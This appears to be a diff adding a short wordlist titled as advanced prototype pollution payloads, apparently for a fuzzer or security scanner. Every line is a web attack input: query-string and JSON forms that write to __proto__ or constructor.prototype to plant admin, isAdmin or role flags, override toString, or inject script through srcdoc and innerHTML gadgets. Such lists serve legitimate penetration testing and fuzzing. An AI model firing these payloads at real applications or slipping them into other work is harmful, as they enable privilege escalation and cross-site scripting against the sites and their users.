@@ -1,0 +1,16 @@
+# Prototype pollution advanced payloads
+__proto__[polluted]=true
+__proto__.polluted=true
+constructor.prototype.polluted=true
+prototype[polluted]=true
+__proto__[admin]=true
+constructor[prototype][admin]=true
+__proto__[isAdmin]=true
+constructor.prototype.isAdmin=true
+__proto__[role]=admin
+constructor[prototype][role]=admin
+__proto__[toString]=polluted
+__proto__[srcdoc]=<script>alert(1)</script>
+__proto__[innerHTML]=<img src=x onerror=alert(1)>
+{"__proto__":{"polluted":true}}
+{"constructor":{"prototype":{"polluted":true}}}
